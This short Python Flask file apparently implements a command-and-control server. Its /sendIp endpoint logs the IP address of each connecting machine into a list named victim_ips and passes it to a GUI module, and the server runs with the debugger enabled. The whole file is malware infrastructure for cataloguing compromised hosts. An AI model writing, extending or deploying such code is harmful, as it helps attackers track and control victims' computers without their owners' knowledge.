from flask import Flask, request, jsonify


victim_ips = []
app = Flask('C2C-Server')

@app.get('/')
def helloC2C():
   return 'Hello C2C!'

@app.get('/sendIp')
def sendIp():
    from gui import addIP
    victim_ips.append(request.remote_addr)
    addIP()
    return jsonify({'ip': request.remote_addr}), 200


if __name__=='__main__':
    app.run(debug=True)
